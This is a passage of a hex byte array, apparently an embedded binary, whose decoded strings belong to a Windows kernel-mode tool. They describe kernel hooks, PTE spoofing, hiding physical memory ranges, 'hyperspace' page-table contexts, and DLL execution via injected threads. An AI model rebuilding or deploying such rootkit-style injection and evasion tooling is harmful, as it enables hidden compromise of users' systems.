    0x78, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x69, 0x6E,
    0x76, 0x61, 0x6C, 0x69, 0x64, 0x20, 0x70, 0x68, 0x79, 0x73, 0x69, 0x63, 0x61, 0x6C, 0x20, 0x61,
    0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B,
    0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x73, 0x65, 0x6C, 0x65, 0x63,
    0x74, 0x65, 0x64, 0x20, 0x62, 0x61, 0x73, 0x65, 0x20, 0x61, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73,
    0x3A, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A,
    0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x6F, 0x75, 0x6E, 0x64, 0x20, 0x6E, 0x74, 0x6F, 0x73, 0x6B,
    0x72, 0x6E, 0x6C, 0x2E, 0x65, 0x78, 0x65, 0x20, 0x61, 0x74, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C,
    0x78, 0x2C, 0x20, 0x73, 0x69, 0x7A, 0x65, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x00,
    0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x67, 0x61, 0x70, 0x20,
    0x66, 0x6F, 0x75, 0x6E, 0x64, 0x3A, 0x20, 0x73, 0x74, 0x61, 0x72, 0x74, 0x3A, 0x20, 0x30, 0x78,
    0x25, 0x6C, 0x6C, 0x78, 0x2C, 0x20, 0x73, 0x69, 0x7A, 0x65, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x6C,
    0x6C, 0x78, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x6B,
    0x65, 0x72, 0x6E, 0x65, 0x6C, 0x5F, 0x6D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x20, 0x66, 0x72, 0x65,
    0x65, 0x69, 0x6E, 0x67, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x70, 0x2C, 0x20, 0x73, 0x69, 0x7A, 0x65,
    0x3A, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A,
    0x20, 0x25, 0x73, 0x3A, 0x20, 0x6B, 0x65, 0x72, 0x6E, 0x65, 0x6C, 0x5F, 0x6D, 0x65, 0x6D, 0x6F,
    0x72, 0x79, 0x20, 0x61, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x64, 0x3A, 0x20, 0x30, 0x78,
    0x25, 0x70, 0x2C, 0x20, 0x73, 0x69, 0x7A, 0x65, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78,
    0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x69, 0x6E, 0x76,
    0x61, 0x6C, 0x69, 0x64, 0x20, 0x70, 0x61, 0x72, 0x61, 0x6D, 0x65, 0x74, 0x65, 0x72, 0x73, 0x20,
    0x2D, 0x20, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74, 0x5F, 0x61, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73,
    0x3A, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x2C, 0x20, 0x62, 0x75, 0x66, 0x66, 0x65, 0x72,
    0x3A, 0x20, 0x25, 0x70, 0x2C, 0x20, 0x73, 0x69, 0x7A, 0x65, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x6C,
    0x6C, 0x78, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x6D,
    0x6F, 0x64, 0x75, 0x6C, 0x65, 0x20, 0x25, 0x64, 0x3A, 0x20, 0x62, 0x61, 0x73, 0x65, 0x3A, 0x20,
    0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x2C, 0x20, 0x53, 0x69, 0x7A, 0x65, 0x3A, 0x20, 0x30, 0x78,
    0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A,
    0x20, 0x50, 0x73, 0x70, 0x45, 0x78, 0x69, 0x74, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x20, 0x6F,
    0x66, 0x66, 0x73, 0x65, 0x74, 0x20, 0x66, 0x72, 0x6F, 0x6D, 0x20, 0x6E, 0x74, 0x6F, 0x73, 0x6B,
    0x72, 0x6E, 0x6C, 0x20, 0x62, 0x61, 0x73, 0x65, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78,
    0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x43, 0x52, 0x33,
    0x20, 0x56, 0x61, 0x6C, 0x75, 0x65, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x2C, 0x20,
    0x50, 0x61, 0x67, 0x65, 0x20, 0x44, 0x69, 0x72, 0x65, 0x63, 0x74, 0x6F, 0x72, 0x79, 0x20, 0x42,
    0x61, 0x73, 0x65, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B, 0x3D, 0x5D, 0x20,
    0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74,
    0x6F, 0x20, 0x77, 0x72, 0x69, 0x74, 0x65, 0x20, 0x70, 0x68, 0x79, 0x73, 0x69, 0x63, 0x61, 0x6C,
    0x20, 0x61, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x20, 0x61, 0x74, 0x20, 0x70, 0x61, 0x67, 0x65,
    0x20, 0x74, 0x61, 0x62, 0x6C, 0x65, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B,
    0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x69, 0x6E, 0x76, 0x61, 0x6C,
    0x69, 0x64, 0x20, 0x50, 0x46, 0x4E, 0x20, 0x72, 0x61, 0x6E, 0x67, 0x65, 0x3A, 0x20, 0x30, 0x78,
    0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A,
    0x20, 0x50, 0x73, 0x70, 0x45, 0x78, 0x69, 0x74, 0x54, 0x68, 0x72, 0x65, 0x61, 0x64, 0x20, 0x61,
    0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x20, 0x69, 0x6E, 0x20, 0x68, 0x79, 0x70, 0x65, 0x72, 0x73,
    0x70, 0x61, 0x63, 0x65, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B, 0x3D, 0x5D,
    0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20,
    0x74, 0x6F, 0x20, 0x6C, 0x6F, 0x63, 0x6B, 0x20, 0x70, 0x61, 0x67, 0x65, 0x20, 0x74, 0x61, 0x62,
    0x6C, 0x65, 0x20, 0x70, 0x61, 0x67, 0x65, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x50, 0x46, 0x4E, 0x3A,
    0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20,
    0x25, 0x73, 0x3A, 0x20, 0x70, 0x64, 0x65, 0x20, 0x6E, 0x6F, 0x74, 0x20, 0x70, 0x72, 0x65, 0x73,
    0x65, 0x6E, 0x74, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x56, 0x41, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x6C,
    0x6C, 0x78, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x50,
    0x54, 0x45, 0x20, 0x6E, 0x6F, 0x74, 0x20, 0x70, 0x72, 0x65, 0x73, 0x65, 0x6E, 0x74, 0x20, 0x66,
    0x6F, 0x72, 0x20, 0x56, 0x41, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B, 0x3D,
    0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x70, 0x64, 0x65, 0x20, 0x69, 0x73,
    0x20, 0x6E, 0x75, 0x6C, 0x6C, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x56, 0x41, 0x3A, 0x20, 0x30, 0x78,
    0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A,
    0x20, 0x50, 0x54, 0x45, 0x20, 0x69, 0x73, 0x20, 0x6E, 0x75, 0x6C, 0x6C, 0x20, 0x66, 0x6F, 0x72,
    0x20, 0x56, 0x41, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B, 0x3D, 0x5D, 0x20,
    0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x70, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x69,
    0x6E, 0x67, 0x20, 0x56, 0x41, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B, 0x3D,
    0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x6F, 0x72, 0x69, 0x67, 0x69, 0x6E,
    0x61, 0x6C, 0x20, 0x50, 0x4D, 0x4C, 0x34, 0x20, 0x50, 0x41, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x6C,
    0x6C, 0x78, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x68,
    0x79, 0x70, 0x65, 0x72, 0x73, 0x70, 0x61, 0x63, 0x65, 0x20, 0x50, 0x4D, 0x4C, 0x34, 0x20, 0x56,
    0x41, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x2C, 0x20, 0x50, 0x41, 0x3A, 0x20, 0x30,
    0x78, 0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x66, 0x6F, 0x75, 0x6E, 0x64, 0x20, 0x2E, 0x74, 0x65, 0x78, 0x74, 0x20, 0x73, 0x65,
    0x63, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0x61, 0x74, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x20,
    0x2D, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A,
    0x20, 0x25, 0x73, 0x3A, 0x20, 0x73, 0x63, 0x61, 0x6E, 0x6E, 0x69, 0x6E, 0x67, 0x20, 0x2E, 0x74,
    0x65, 0x78, 0x74, 0x20, 0x73, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0x72, 0x61, 0x6E, 0x67,
    0x65, 0x20, 0x28, 0x70, 0x61, 0x67, 0x65, 0x2D, 0x61, 0x6C, 0x69, 0x67, 0x6E, 0x65, 0x64, 0x29,
    0x3A, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C, 0x78, 0x20, 0x2D, 0x20, 0x30, 0x78, 0x25, 0x6C, 0x6C,
    0x78, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61,
    0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x69, 0x6E, 0x73, 0x74, 0x61, 0x6C, 0x6C, 0x20,
    0x6B, 0x65, 0x72, 0x6E, 0x65, 0x6C, 0x20, 0x68, 0x6F, 0x6F, 0x6B, 0x73, 0x20, 0x69, 0x6E, 0x20,
    0x68, 0x79, 0x70, 0x65, 0x72, 0x73, 0x70, 0x61, 0x63, 0x65, 0x20, 0x63, 0x6F, 0x6E, 0x74, 0x65,
    0x78, 0x74, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x78, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A,
    0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x72,
    0x65, 0x67, 0x69, 0x73, 0x74, 0x65, 0x72, 0x20, 0x70, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x20,
    0x63, 0x61, 0x6C, 0x6C, 0x62, 0x61, 0x63, 0x6B, 0x3A, 0x20, 0x30, 0x78, 0x25, 0x78, 0x00, 0x5B,
    0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x69, 0x6E, 0x69, 0x74, 0x69,
    0x61, 0x6C, 0x69, 0x7A, 0x65, 0x64, 0x20, 0x70, 0x61, 0x67, 0x65, 0x20, 0x74, 0x72, 0x61, 0x63,
    0x6B, 0x69, 0x6E, 0x67, 0x20, 0x77, 0x69, 0x74, 0x68, 0x20, 0x63, 0x61, 0x70, 0x61, 0x63, 0x69,
    0x74, 0x79, 0x20, 0x25, 0x7A, 0x75, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25,
    0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x61, 0x6C, 0x6C,
    0x6F, 0x63, 0x61, 0x74, 0x65, 0x20, 0x74, 0x65, 0x6D, 0x70, 0x20, 0x62, 0x75, 0x66, 0x66, 0x65,
    0x72, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x70, 0x61, 0x67, 0x65, 0x20, 0x25, 0x7A, 0x75, 0x00, 0x5B,
    0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65,
    0x64, 0x20, 0x74, 0x6F, 0x20, 0x61, 0x6C, 0x6C, 0x6F, 0x63, 0x61, 0x74, 0x65, 0x20, 0x70, 0x61,
    0x67, 0x65, 0x20, 0x25, 0x7A, 0x75, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25,
    0x73, 0x3A, 0x20, 0x6E, 0x75, 0x6D, 0x62, 0x65, 0x72, 0x20, 0x6F, 0x66, 0x20, 0x70, 0x61, 0x67,
    0x65, 0x73, 0x20, 0x74, 0x6F, 0x20, 0x70, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x3A, 0x20, 0x25,
    0x7A, 0x75, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x6D,
    0x61, 0x70, 0x70, 0x69, 0x6E, 0x67, 0x20, 0x25, 0x7A, 0x75, 0x20, 0x70, 0x61, 0x67, 0x65, 0x73,
    0x20, 0x73, 0x74, 0x61, 0x72, 0x74, 0x69, 0x6E, 0x67, 0x20, 0x61, 0x74, 0x20, 0x50, 0x44, 0x20,
    0x69, 0x6E, 0x64, 0x65, 0x78, 0x20, 0x25, 0x75, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A,
    0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x61,
    0x63, 0x71, 0x75, 0x69, 0x72, 0x65, 0x20, 0x72, 0x75, 0x6E, 0x64, 0x6F, 0x77, 0x6E, 0x20, 0x70,
    0x72, 0x6F, 0x74, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0x66, 0x6F, 0x72, 0x20, 0x70, 0x72,
    0x6F, 0x63, 0x65, 0x73, 0x73, 0x20, 0x25, 0x75, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A,
    0x20, 0x25, 0x73, 0x3A, 0x20, 0x69, 0x6E, 0x76, 0x61, 0x6C, 0x69, 0x64, 0x20, 0x25, 0x73, 0x20,
    0x69, 0x6E, 0x64, 0x65, 0x78, 0x20, 0x72, 0x61, 0x6E, 0x67, 0x65, 0x20, 0x6F, 0x72, 0x64, 0x65,
    0x72, 0x3A, 0x20, 0x25, 0x75, 0x20, 0x3E, 0x3D, 0x20, 0x25, 0x75, 0x00, 0x5B, 0x3D, 0x5D, 0x20,
    0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x6F, 0x75, 0x6E, 0x64, 0x20, 0x50, 0x4D,
    0x4C, 0x34, 0x20, 0x73, 0x65, 0x6C, 0x66, 0x2D, 0x72, 0x65, 0x66, 0x65, 0x72, 0x65, 0x6E, 0x63,
    0x65, 0x20, 0x65, 0x6E, 0x74, 0x72, 0x79, 0x20, 0x61, 0x74, 0x20, 0x69, 0x6E, 0x64, 0x65, 0x78,
    0x3A, 0x20, 0x25, 0x75, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A,
    0x20, 0x66, 0x6F, 0x75, 0x6E, 0x64, 0x20, 0x25, 0x75, 0x20, 0x61, 0x76, 0x61, 0x69, 0x6C, 0x61,
    0x62, 0x6C, 0x65, 0x20, 0x50, 0x4D, 0x4C, 0x34, 0x45, 0x20, 0x69, 0x6E, 0x64, 0x69, 0x63, 0x65,
    0x73, 0x2C, 0x20, 0x72, 0x61, 0x6E, 0x64, 0x6F, 0x6D, 0x6C, 0x79, 0x20, 0x73, 0x65, 0x6C, 0x65,
    0x63, 0x74, 0x65, 0x64, 0x20, 0x69, 0x6E, 0x64, 0x65, 0x78, 0x3A, 0x20, 0x25, 0x75, 0x00, 0x63,
    0x6C, 0x65, 0x61, 0x6E, 0x75, 0x70, 0x5F, 0x68, 0x79, 0x70, 0x65, 0x72, 0x73, 0x70, 0x61, 0x63,
    0x65, 0x5F, 0x63, 0x6F, 0x6E, 0x74, 0x65, 0x78, 0x74, 0x00, 0x69, 0x6E, 0x69, 0x74, 0x69, 0x61,
    0x6C, 0x69, 0x7A, 0x65, 0x5F, 0x68, 0x79, 0x70, 0x65, 0x72, 0x73, 0x70, 0x61, 0x63, 0x65, 0x5F,
    0x63, 0x6F, 0x6E, 0x74, 0x65, 0x78, 0x74, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20,
    0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x69, 0x6E,
    0x69, 0x74, 0x20, 0x68, 0x79, 0x70, 0x65, 0x72, 0x73, 0x70, 0x61, 0x63, 0x65, 0x20, 0x63, 0x6F,
    0x6E, 0x74, 0x65, 0x78, 0x74, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x63, 0x6C, 0x65, 0x61, 0x6E, 0x69, 0x6E, 0x67, 0x20, 0x75, 0x70, 0x20, 0x68, 0x79,
    0x70, 0x65, 0x72, 0x73, 0x70, 0x61, 0x63, 0x65, 0x20, 0x63, 0x6F, 0x6E, 0x74, 0x65, 0x78, 0x74,
    0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x69, 0x6E, 0x76,
    0x61, 0x6C, 0x69, 0x64, 0x20, 0x68, 0x79, 0x70, 0x65, 0x72, 0x73, 0x70, 0x61, 0x63, 0x65, 0x20,
    0x63, 0x6F, 0x6E, 0x74, 0x65, 0x78, 0x74, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20,
    0x25, 0x73, 0x3A, 0x20, 0x69, 0x6E, 0x76, 0x61, 0x6C, 0x69, 0x64, 0x20, 0x6F, 0x72, 0x20, 0x75,
    0x6E, 0x69, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x65, 0x64, 0x20, 0x68, 0x79, 0x70,
    0x65, 0x72, 0x73, 0x70, 0x61, 0x63, 0x65, 0x20, 0x63, 0x6F, 0x6E, 0x74, 0x65, 0x78, 0x74, 0x00,
    0x2E, 0x74, 0x65, 0x78, 0x74, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x6E, 0x74, 0x6F, 0x73, 0x6B, 0x72, 0x6E, 0x6C, 0x2E, 0x65, 0x78, 0x65, 0x20, 0x6E,
    0x6F, 0x74, 0x20, 0x66, 0x6F, 0x75, 0x6E, 0x64, 0x20, 0x69, 0x6E, 0x20, 0x6D, 0x6F, 0x64, 0x75,
    0x6C, 0x65, 0x20, 0x6C, 0x69, 0x73, 0x74, 0x00, 0x68, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x5F, 0x73,
    0x77, 0x61, 0x70, 0x5F, 0x63, 0x6F, 0x6E, 0x74, 0x65, 0x78, 0x74, 0x5F, 0x72, 0x65, 0x71, 0x75,
    0x65, 0x73, 0x74, 0x00, 0x68, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x5F, 0x72, 0x65, 0x73, 0x74, 0x6F,
    0x72, 0x65, 0x5F, 0x63, 0x6F, 0x6E, 0x74, 0x65, 0x78, 0x74, 0x5F, 0x72, 0x65, 0x71, 0x75, 0x65,
    0x73, 0x74, 0x00, 0x68, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x5F, 0x61, 0x6C, 0x6C, 0x6F, 0x63, 0x61,
    0x74, 0x65, 0x5F, 0x69, 0x6E, 0x64, 0x65, 0x70, 0x65, 0x6E, 0x64, 0x65, 0x6E, 0x74, 0x5F, 0x70,
    0x61, 0x67, 0x65, 0x73, 0x5F, 0x72, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x00, 0x68, 0x61, 0x6E,
    0x64, 0x6C, 0x65, 0x5F, 0x70, 0x61, 0x74, 0x74, 0x65, 0x72, 0x6E, 0x5F, 0x72, 0x65, 0x71, 0x75,
    0x65, 0x73, 0x74, 0x00, 0x68, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x5F, 0x62, 0x61, 0x73, 0x65, 0x5F,
    0x72, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x00, 0x68, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x5F, 0x75,
    0x6E, 0x6C, 0x6F, 0x61, 0x64, 0x5F, 0x72, 0x65, 0x71, 0x75, 0x65, 0x73, 0x74, 0x00, 0x68, 0x61,
    0x6E, 0x64, 0x6C, 0x65, 0x5F, 0x65, 0x78, 0x65, 0x63, 0x75, 0x74, 0x65, 0x5F, 0x64, 0x6C, 0x6C,
    0x5F, 0x76, 0x69, 0x61, 0x5F, 0x74, 0x68, 0x72, 0x65, 0x61, 0x64, 0x5F, 0x72, 0x65, 0x71, 0x75,
    0x65, 0x73, 0x74, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20,
    0x73, 0x74, 0x61, 0x72, 0x74, 0x69, 0x6E, 0x67, 0x20, 0x4D, 0x69, 0x47, 0x65, 0x74, 0x50, 0x68,
    0x79, 0x73, 0x69, 0x63, 0x61, 0x6C, 0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x52, 0x61, 0x6E, 0x67,
    0x65, 0x73, 0x20, 0x6D, 0x61, 0x6E, 0x69, 0x70, 0x75, 0x6C, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x20,
    0x74, 0x65, 0x73, 0x74, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A,
    0x20, 0x6E, 0x74, 0x6F, 0x73, 0x6B, 0x72, 0x6E, 0x6C, 0x20, 0x63, 0x6F, 0x70, 0x79, 0x20, 0x6E,
    0x6F, 0x74, 0x20, 0x63, 0x72, 0x65, 0x61, 0x74, 0x65, 0x64, 0x20, 0x79, 0x65, 0x74, 0x00, 0x6F,
    0x62, 0x6A, 0x65, 0x63, 0x74, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x66, 0x6F, 0x75, 0x6E, 0x64, 0x20, 0x64, 0x72, 0x69, 0x76, 0x65, 0x72, 0x20, 0x77,
    0x69, 0x74, 0x68, 0x20, 0x63, 0x61, 0x6C, 0x6C, 0x62, 0x61, 0x63, 0x6B, 0x20, 0x73, 0x75, 0x70,
    0x70, 0x6F, 0x72, 0x74, 0x3A, 0x20, 0x25, 0x77, 0x73, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73,
    0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x6F, 0x75, 0x6E, 0x64, 0x20, 0x6C, 0x65, 0x67, 0x69,
    0x74, 0x69, 0x6D, 0x61, 0x74, 0x65, 0x20, 0x64, 0x72, 0x69, 0x76, 0x65, 0x72, 0x20, 0x66, 0x6F,
    0x72, 0x20, 0x63, 0x61, 0x6C, 0x6C, 0x62, 0x61, 0x63, 0x6B, 0x73, 0x3A, 0x20, 0x25, 0x77, 0x73,
    0x00, 0x69, 0x6E, 0x69, 0x74, 0x69, 0x61, 0x6C, 0x69, 0x7A, 0x65, 0x5F, 0x63, 0x6C, 0x6F, 0x6E,
    0x65, 0x64, 0x5F, 0x65, 0x70, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x5F, 0x6C, 0x69, 0x73, 0x74,
    0x73, 0x00, 0x73, 0x63, 0x61, 0x6E, 0x5F, 0x6F, 0x66, 0x66, 0x73, 0x65, 0x74, 0x73, 0x00, 0x77,
    0x72, 0x69, 0x74, 0x65, 0x5F, 0x70, 0x68, 0x79, 0x73, 0x69, 0x63, 0x61, 0x6C, 0x5F, 0x61, 0x64,
    0x64, 0x72, 0x65, 0x73, 0x73, 0x00, 0x72, 0x65, 0x61, 0x64, 0x5F, 0x70, 0x68, 0x79, 0x73, 0x69,
    0x63, 0x61, 0x6C, 0x5F, 0x61, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x00, 0x5B, 0x3D, 0x5D, 0x20,
    0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74,
    0x6F, 0x20, 0x73, 0x70, 0x6F, 0x6F, 0x66, 0x20, 0x70, 0x74, 0x65, 0x20, 0x72, 0x61, 0x6E, 0x67,
    0x65, 0x20, 0x61, 0x74, 0x20, 0x74, 0x61, 0x72, 0x67, 0x65, 0x74, 0x20, 0x61, 0x64, 0x64, 0x72,
    0x65, 0x73, 0x73, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20,
    0x66, 0x61, 0x69, 0x6C, 0x65, 0x64, 0x20, 0x74, 0x6F, 0x20, 0x67, 0x65, 0x74, 0x20, 0x70, 0x68,
    0x79, 0x73, 0x69, 0x63, 0x61, 0x6C, 0x20, 0x61, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x00, 0x5B,
    0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65,
    0x64, 0x20, 0x74, 0x6F, 0x20, 0x67, 0x65, 0x74, 0x20, 0x43, 0x52, 0x33, 0x20, 0x70, 0x68, 0x79,
    0x73, 0x69, 0x63, 0x61, 0x6C, 0x20, 0x61, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x00, 0x5B, 0x3D,
    0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x66, 0x61, 0x69, 0x6C, 0x65, 0x64,
    0x20, 0x74, 0x6F, 0x20, 0x67, 0x65, 0x74, 0x20, 0x50, 0x45, 0x42, 0x20, 0x61, 0x64, 0x64, 0x72,
    0x65, 0x73, 0x73, 0x00, 0x5B, 0x3D, 0x5D, 0x20, 0x25, 0x73, 0x3A, 0x20, 0x25, 0x73, 0x3A, 0x20,
